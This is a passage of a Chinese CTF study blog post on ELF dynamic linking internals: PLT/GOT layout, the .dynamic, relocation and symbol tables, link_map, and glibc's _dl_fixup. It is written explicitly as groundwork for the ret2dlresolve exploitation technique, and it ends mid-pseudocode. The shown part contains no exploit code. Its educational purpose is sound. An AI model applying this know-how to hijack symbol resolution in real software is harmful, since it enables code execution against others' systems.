<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jmp * func@got</span><br><span class="line">push index</span><br><span class="line">jmp * _dl_runtime_resolve@got</span><br></pre></td></tr></table></figure>
<p>如果got中填写了正确的函数地址,则会直接调用该函数</p>
<p>如果got中填写了push index的地址,则调用_dl_runtime_resolve解析符号</p>
<p>解析符号的依据就是这个index,导入函数下标</p>
<p>.plt(procedure Linkage Table，过程链接表)</p>
<p>.plt.got专门用于存放<code>__cxa_finalize</code>函数的plt条目</p>
<h3 id="got的作用">GOT的作用</h3>
<p>存放函数地址</p>
<p>如果尚未解析则存放对应函数plt中的下一条指令地址</p>
<p>GOT表分成两部分</p>
<p>.got和.got.plt</p>
<p>.got(Global Offset Table),全局变量地址表</p>
<p>.got.plt是全局函数地址表</p>
<p>前面我们所说的write@got实际上是write<span class="citation"
data-cites="got.plt">@got.plt</span></p>
<p>.got表纯纯存放全局变量地址,有一个算一个,没有特别之处</p>
<p>.got.plt的前三个表项存放了特殊地址,其后的表项就是全局函数地址了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:0804A000 14 9F 04 08                   _GLOBAL_OFFSET_TABLE_ dd offset _DYNAMIC</span><br><span class="line">.got.plt:0804A000                                                                       ; DATA XREF: _init_proc+9↑o</span><br><span class="line">.got.plt:0804A000                                                                       ; _start+10↑o ...</span><br><span class="line">.got.plt:0804A004 00 00 00 00                   dword_804A004   dd 0                    ; DATA XREF: sub_80482D0↑r</span><br><span class="line">.got.plt:0804A008 00 00 00 00                   dword_804A008   dd 0                    ; DATA XREF: sub_80482D0+6↑r</span><br><span class="line">.got.plt:0804A00C 24 A0 04 08                   off_804A00C     dd offset __libc_start_main</span><br><span class="line">.got.plt:0804A00C                                                                       ; DATA XREF: ___libc_start_main↑r</span><br><span class="line">.got.plt:0804A010 28 A0 04 08                   off_804A010     dd offset write         ; DATA XREF: _write↑r</span><br><span class="line">.got.plt:0804A010                               _got_plt        ends</span><br></pre></td></tr></table></figure>
<h4 id="got.plt0.dynamic">.GOT.PLT[0]=.dynamic</h4>
<p>.GOT.PLT[0]存放.dynamic节的地址,在节头表中可以查看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/CTF-All-In-One/src/writeup/6.1.3_pwn_xdctf2015_pwn200# readelf -S test</span><br><span class="line">There are 35 section headers, starting at offset 0x1fbc:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">	...</span><br><span class="line">  [21] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class="line">	...</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  p (processor specific)</span><br></pre></td></tr></table></figure>
<p>.dynamic节在0x08049f14,因此GOT[0]=0x08049f14</p>
<p>这个节的作用是什么呢?</p>
<p>可以用readelf -d查看节内容</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/CTF-All-In-One/src/writeup/<span class="number">6.1</span><span class="number">.3</span>_pwn_xdctf2015_pwn200<span class="meta"># readelf -d test</span></span><br><span class="line"></span><br><span class="line">Dynamic section at offset <span class="number">0xf14</span> contains <span class="number">24</span> entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> <span class="number">0x00000001</span> (NEEDED)                     Shared library: [libc.so<span class="number">.6</span>]</span><br><span class="line"> <span class="number">0x0000000c</span> (INIT)                       <span class="number">0x80482ac</span></span><br><span class="line"> <span class="number">0x0000000d</span> (FINI)                       <span class="number">0x80484d4</span></span><br><span class="line"> <span class="number">0x00000019</span> (INIT_ARRAY)                 <span class="number">0x8049f0c</span></span><br><span class="line"> <span class="number">0x0000001b</span> (INIT_ARRAYSZ)               <span class="number">4</span> (bytes)</span><br><span class="line"> <span class="number">0x0000001a</span> (FINI_ARRAY)                 <span class="number">0x8049f10</span></span><br><span class="line"> <span class="number">0x0000001c</span> (FINI_ARRAYSZ)               <span class="number">4</span> (bytes)</span><br><span class="line"> <span class="number">0x6ffffef5</span> (GNU_HASH)                   <span class="number">0x80481ac</span></span><br><span class="line"> <span class="number">0x00000005</span> (STRTAB)                     <span class="number">0x804821c</span></span><br><span class="line"> <span class="number">0x00000006</span> (SYMTAB)                     <span class="number">0x80481cc</span></span><br><span class="line"> <span class="number">0x0000000a</span> (STRSZ)                      <span class="number">75</span> (bytes)</span><br><span class="line"> <span class="number">0x0000000b</span> (SYMENT)                     <span class="number">16</span> (bytes)</span><br><span class="line"> <span class="number">0x00000015</span> (DEBUG)                      <span class="number">0x0</span></span><br><span class="line"> <span class="number">0x00000003</span> (PLTGOT)                     <span class="number">0x804a000</span></span><br><span class="line"> <span class="number">0x00000002</span> (PLTRELSZ)                   <span class="number">16</span> (bytes)</span><br><span class="line"> <span class="number">0x00000014</span> (PLTREL)                     REL</span><br><span class="line"> <span class="number">0x00000017</span> (JMPREL)                     <span class="number">0x804829c</span></span><br><span class="line"> <span class="number">0x00000011</span> (REL)                        <span class="number">0x8048294</span></span><br><span class="line"> <span class="number">0x00000012</span> (RELSZ)                      <span class="number">8</span> (bytes)</span><br><span class="line"> <span class="number">0x00000013</span> (RELENT)                     <span class="number">8</span> (bytes)</span><br><span class="line"> <span class="number">0x6ffffffe</span> (VERNEED)                    <span class="number">0x8048274</span></span><br><span class="line"> <span class="number">0x6fffffff</span> (VERNEEDNUM)                 <span class="number">1</span></span><br><span class="line"> <span class="number">0x6ffffff0</span> (VERSYM)                     <span class="number">0x8048268</span></span><br><span class="line"> <span class="number">0x00000000</span> (<span class="literal">NULL</span>)                       <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>每一项都是一个<code>Elf32_Dyn</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure>
<p>这是一个键值对,键是d_tag,值要么是d_val要么是d_ptr</p>
<p>d_tag是一些枚举值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DT_NULL    0   <span class="comment">/* Marks end of dynamic section */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_NEEDED  1   <span class="comment">/* Name of needed library */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTRELSZ 2  <span class="comment">/* Size in bytes of PLT relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTGOT  3   <span class="comment">/* Processor defined value */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_HASH    4   <span class="comment">/* Address of symbol hash table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_STRTAB  5   <span class="comment">/* Address of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMTAB  6   <span class="comment">/* Address of symbol table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELA    7   <span class="comment">/* Address of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELASZ  8   <span class="comment">/* Total size of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_STRSZ   10  <span class="comment">/* Size in bytes of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMENT  11  <span class="comment">/* Size of one symbol table entry */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_INIT    12  <span class="comment">/* Address of init function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_FINI    13  <span class="comment">/* Address of termination function */</span></span></span><br></pre></td></tr></table></figure>
<p>这个节指示了很多信息,比如init函数和init_array的地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0000000c</span> (INIT)                       <span class="number">0x80482ac</span></span><br><span class="line"><span class="number">0x00000019</span> (INIT_ARRAY)                 <span class="number">0x8049f0c</span></span><br></pre></td></tr></table></figure>
<p>比如符号表和字符串表地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x00000005 (STRTAB)                     0x804821c</span><br><span class="line">0x00000006 (SYMTAB)                     0x80481cc</span><br></pre></td></tr></table></figure>
<p>比如重定位信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00000011</span> (REL)                        <span class="number">0x8048294</span></span><br></pre></td></tr></table></figure>
<p>这个表有何作用呢?</p>
<p>一是指导动态链接器进行</p>
<p>​ 加载so</p>
<p>​ 解析符号</p>
<p>​ 重定位</p>
<p>​ 调用初始化函数</p>
<p>二是运行时</p>
<p>​ 延迟绑定</p>
<p>​ 处理dlopen显示加载的函数</p>
<blockquote>
<p>关于重定位</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/CTF-All-In-One/src/writeup/6.1.3_pwn_xdctf2015_pwn200# readelf -r <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.dyn&#x27;</span> at offset 0x294 contains 1 entry:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">08049ffc  00000106 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.plt&#x27;</span> at offset 0x29c contains 2 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">0804a00c  00000207 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a010  00000307 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0</span><br></pre></td></tr></table></figure>
<p>每一个重定位表项都对应一个<code>Elf32_Rel</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset;       <span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word    r_info;         <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>
<p>r_offset是符号got表项的虚拟地址</p>
<p>r_info是符号的重定位类型和符号下标</p>
<p>​
重定位类型最常见全局变量的R_386_GLOB_DAT和全局函数的R_386_JUMP_SLOT</p>
<p>​ 符号下标索引.dynsym节</p>
<p>比如<code>write</code>的索引是3,</p>
<p><code>libc_start_main</code>的索引是2</p>
<p><code>__gmon_start__</code>的索引是1</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/CTF-All-In-One/src/writeup/<span class="number">6.1</span><span class="number">.3</span>_pwn_xdctf2015_pwn200<span class="meta"># readelf -s test</span></span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.dynsym&#x27;</span> contains <span class="number">5</span> entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     <span class="number">1</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">     <span class="number">2</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2<span class="number">.0</span> (<span class="number">2</span>)</span><br><span class="line">     <span class="number">3</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND write@GLIBC_2<span class="number">.0</span> (<span class="number">2</span>)</span><br><span class="line">     <span class="number">4</span>: <span class="number">080484</span>ec     <span class="number">4</span> OBJECT  GLOBAL DEFAULT   <span class="number">16</span> _IO_stdin_used</span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">70</span> entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">		...</span><br><span class="line">    <span class="number">32</span>: <span class="number">00000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS crtstuff.c</span><br><span class="line">    <span class="number">33</span>: <span class="number">08048370</span>     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">14</span> deregister_tm_clones</span><br><span class="line">    <span class="number">34</span>: <span class="number">080483b</span>0     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">14</span> register_tm_clones</span><br><span class="line">    <span class="number">35</span>: <span class="number">080483f</span>0     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">14</span> __do_global_dtors_aux</span><br><span class="line">    <span class="number">36</span>: <span class="number">0804</span>a01c     <span class="number">1</span> OBJECT  LOCAL  DEFAULT   <span class="number">25</span> completed<span class="number">.7283</span></span><br><span class="line">    <span class="number">37</span>: <span class="number">08049f</span>10     <span class="number">0</span> OBJECT  LOCAL  DEFAULT   <span class="number">20</span> __do_global_dtors_aux_fin</span><br><span class="line">    <span class="number">38</span>: <span class="number">08048420</span>     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">14</span> frame_dummy</span><br><span class="line">    <span class="number">39</span>: <span class="number">08049f</span>0c     <span class="number">0</span> OBJECT  LOCAL  DEFAULT   <span class="number">19</span> __frame_dummy_init_array_</span><br><span class="line">    <span class="number">40</span>: <span class="number">00000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS test.c</span><br><span class="line">	...</span><br><span class="line">    <span class="number">66</span>: <span class="number">08048426</span>    <span class="number">64</span> FUNC    GLOBAL DEFAULT   <span class="number">14</span> main</span><br><span class="line">    <span class="number">67</span>: <span class="number">08048466</span>     <span class="number">0</span> FUNC    GLOBAL HIDDEN    <span class="number">14</span> __x86.get_pc_thunk.ax</span><br><span class="line">    <span class="number">68</span>: <span class="number">0804</span>a01c     <span class="number">0</span> OBJECT  GLOBAL HIDDEN    <span class="number">24</span> __TMC_END__</span><br><span class="line">    <span class="number">69</span>: <span class="number">080482</span>ac     <span class="number">0</span> FUNC    GLOBAL DEFAULT   <span class="number">11</span> _init</span><br></pre></td></tr></table></figure>
<p>readelf
-s会读取两个表,一个是本地符号表symtab,一个是链接符号表.dynsym</p>
<p>这个symtab可以strip掉,不影响程序执行</p>
<p>而实际上这两个符号表的表项中并没有Name数组,st_name是一个索引,索引字符串表.strtab</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name;        /* Symbol name (string tbl index) */</span><br><span class="line">  Elf32_Addr    st_value;       /* Symbol value */</span><br><span class="line">  Elf32_Word    st_size;        /* Symbol size */</span><br><span class="line">  unsigned char st_info;        /* Symbol type and binding */</span><br><span class="line">  unsigned char st_other;       /* Symbol visibility */</span><br><span class="line">  Elf32_Section st_shndx;       /* Section index */</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1C7Ch: 00 63 72 74 73 74 75 66 66 2E 63 00 64 65 72 65  .crtstuff.c.dere </span><br><span class="line">1C8Ch: 67 69 73 74 65 72 5F 74 6D 5F 63 6C 6F 6E 65 73  gister_tm_clones </span><br><span class="line">1C9Ch: 00 5F 5F 64 6F 5F 67 6C 6F 62 61 6C 5F 64 74 6F  .__do_global_dto </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>比如crtstuff.c的符号表项Elf32_Sym中,st_name=1,对应0x1c7c+1</p>
<p>比如deregister_tm_clones的符号表项Elf32_Sym中,st_name=c,对应0x1c7c+c</p>
<p>这里0x1c7c是.strtab节在文件中的偏移量,可以使用readelf
-S查看对应节区</p>
</blockquote>
<h4 id="got.plt1link_map-ld">.GOT.PLT[1]=link_map @ ld</h4>
<p>.GOT.PLT[1]和.GOT.PLT[2]在编译链接时无法决定是啥，只有在运行时才会知道是什么</p>
<p>.GOT.PLT[1]用于存放<strong>主模块的</strong>link_map数据结构的地址</p>
<p>每个模块(主模块以及所有加载的动态库)都各自有一个link_map</p>
<p>这个link_map保存了对应模块的诸多信息,比如各个节区的地址,elf头的地址,模块名等</p>
<h4 id="got.plt2dl_runtime_resolve-ld">.GOT.PLT[2]=dl_runtime_resolve @
ld</h4>
<p>存放dl_runtime_resolve的地址</p>
<h4 id="got.plt3">.GOT.PLT[3+]</h4>
<p>第四项及之后,该表用于保存函数的虚拟地址</p>
<h3 id="疑问">疑问</h3>
<p>每个函数的plt表都有三项</p>
<p>jmp</p>
<p>push</p>
<p>jmp</p>
<p>这里第一个jmp调试观察是到push这行</p>
<p>第二个jmp是到dl_runtime_resolve函数中</p>
<p>那么中间push了什么呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//____libc_start_main</span><br><span class="line">.plt:080482E0 FF 25 0C A0 04 08                             jmp     ds:off_804A00C</span><br><span class="line">.plt:080482E6 68 00 00 00 00                                push    0</span><br><span class="line">.plt:080482EB E9 E0 FF FF FF                                jmp     sub_80482D0</span><br><span class="line"></span><br><span class="line">//write</span><br><span class="line">.plt:080482F0 FF 25 10 A0 04 08                             jmp     ds:off_804A010</span><br><span class="line">.plt:080482F6 68 08 00 00 00                                push    8</span><br><span class="line">.plt:080482FB E9 D0 FF FF FF                                jmp     sub_80482D0</span><br></pre></td></tr></table></figure>
<p>符号又到底是如何解析并且回填到GOT表的呢?</p>
<p>为了解决这些问题,以及学习ret2dlresolve的原理,</p>
<p>下面我们阅读<code>_dl_fixup</code>的源码寻找答案</p>
<h2 id="dl_fixup">_dl_fixup</h2>
<p>以write为例，观察该符号是如何解析的</p>
<p>解析符号发生在<code>_dl_fixup</code>函数中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (<span class="keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)</span><br></pre></td></tr></table></figure>
<p>该函数有两个参数，其中<code>link_map *l</code>参数就是<code>.got.plt[1]</code>,</p>
<p>参数reloc_arg是目标函数在.rel.plt中的偏移量</p>
<p>reloc_arg在write@plt中被压入栈中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x80483a0</span> &lt;write@plt&gt;:       jmp    DWORD PTR ds:<span class="number">0x80498d4</span></span><br><span class="line"><span class="number">0x80483a6</span> &lt;write@plt+<span class="number">6</span>&gt;:     push   <span class="number">0x20</span></span><br><span class="line"><span class="number">0x80483ab</span> &lt;write@plt+<span class="number">11</span>&gt;:    jmp    <span class="number">0x8048350</span></span><br></pre></td></tr></table></figure>
<p>然后跳转到<code>plt[0]=0x8048350</code>，这是<code>_dl_runtime_resolve</code>的导火索，在这里首先将<code>link_map *l</code>压入栈中,然后跳转_<code>dl_runtime_resolve</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x8048350</span>                              push   dword ptr [<span class="number">0x80498bc</span>]</span><br><span class="line">  <span class="number">0x8048356</span>                              jmp    dword ptr [<span class="number">0x80498c0</span>]       &lt;_dl_runtime_resolve&gt;</span><br></pre></td></tr></table></figure>
<p>在<code>_dl_runtime_resolve</code>中,这两个参数又改用<code>eax(link_map *l)</code>和<code>edx(reloc_arg)</code>传递,稍微违背了x86调用约定,但是问题不大</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_dl_runtime_resolve:</span><br><span class="line">	cfi_adjust_cfa_offset (<span class="number">8</span>)</span><br><span class="line">	_CET_ENDBR</span><br><span class="line">	pushl %eax		# Preserve registers otherwise clobbered.</span><br><span class="line">	cfi_adjust_cfa_offset (<span class="number">4</span>)</span><br><span class="line">	pushl %ecx</span><br><span class="line">	<span class="title function_">cfi_adjust_cfa_offset</span> <span class="params">(<span class="number">4</span>)</span></span><br><span class="line">	pushl %edx</span><br><span class="line">	<span class="title function_">cfi_adjust_cfa_offset</span> <span class="params">(<span class="number">4</span>)</span></span><br><span class="line">	movl 16<span class="params">(%esp)</span>, %edx	# Copy args pushed by PLT in <span class="keyword">register</span>.  Note</span><br><span class="line">	movl 12<span class="params">(%esp)</span>, %eax	<span class="meta"># that `fixup<span class="string">&#x27; takes its parameters in regs.</span></span></span><br><span class="line"><span class="string"><span class="meta">	call _dl_fixup		# Call resolver.</span></span></span><br></pre></td></tr></table></figure>
<p><code>_dl_runtime_resolve</code>实际上只是一个包装函数,实际工作是<code>_dl_fixup</code>完成的</p>
<p><code>_dl_fixup</code>干了啥呢?</p>
<p><code>_dl_fixup</code>知道两件事,</p>
<p>一个是主程序模块的<code>link_map</code>,这玩意儿保存了很多信息,包括它属于哪个模块,该模块的elf信息等等</p>
<p>一个进程所有模块的<code>link_map</code>以双向链表连接</p>
<blockquote>
<p>每个模块(主程序和每个so库)各自有一个link_map</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/s l.l_name</span><br><span class="line">$<span class="number">8</span> = <span class="number">0xf7ffdd2c</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt; p/s l.l_next.l_name</span><br><span class="line">$<span class="number">9</span> = <span class="number">0xf7fc828c</span> <span class="string">&quot;linux-gate.so.1&quot;</span></span><br><span class="line">pwndbg&gt; p/s l.l_next.l_next.l_name</span><br><span class="line">$<span class="number">10</span> = <span class="number">0xf7fc2390</span> <span class="string">&quot;/home/glibc32/lib/libc.so.6&quot;</span></span><br><span class="line">pwndbg&gt; p/s l.l_next.l_next.l_next.l_name</span><br><span class="line">$<span class="number">11</span> = <span class="number">0x8046174</span> <span class="string">&quot;/home/glibc32/lib/ld-linux.so.2&quot;</span></span><br><span class="line">pwndbg&gt; p/s l.l_next.l_next.l_next.l_next.l_name</span><br><span class="line">Cannot access memory at address <span class="number">0x4</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>另一个就是reloc_arg,也就是他要解析的函数符号,在.rel.plt节区中的偏移</p>
<p>显然抛开基地址谈偏移量是没有意义的,因此下面要做的第一件事是找到.rel.plt的基地址</p>
<p>怎么找呢?</p>
<p>大体步骤如下伪代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup(<span class="keyword">struct</span> link_map *l,ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 1.找到dynamic节,1-&gt;1l_info就是dynamic节,</span></span><br><span class="line">    <span class="comment">//从dynamic节中找到.rel.plt节记为reloc</span></span><br><span class="line">    <span class="comment">//从dynamic节中找到符号表symtab,</span></span><br><span class="line">    <span class="comment">//从dynamic节中找到字符串表strtab</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="comment">// 2.使用reloc_arg配合reloc表找到该表中的具体项目Elf32_Rel</span></span><br><span class="line">    <span class="comment">//        typedef struct&#123;</span></span><br><span class="line">    <span class="comment">//            Elf32_Addr  r_offset;       //符号要填充的got表项的虚拟地址</span></span><br><span class="line">    <span class="comment">//            Elf32_Word  r_info;         //符号在符号表中的下标</span></span><br><span class="line">    <span class="comment">//        &#125; Elf32_Rel;</span></span><br><span class="line">	<span class="type">const</span> PLTREL *<span class="type">const</span> reloc = (<span class="type">const</span> <span class="type">void</span> *)(D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="comment">// 3.找到符号表对应表项</span></span><br><span class="line">    <span class="comment">//        typedef struct &#123;</span></span><br><span class="line">    <span class="comment">//            Elf32_Word	st_name;	//符号名字符串在字符串表中的偏移</span></span><br><span class="line">    <span class="comment">//            Elf32_Addr	st_value;	//符号在其所在模块中的偏移量</span></span><br><span class="line">    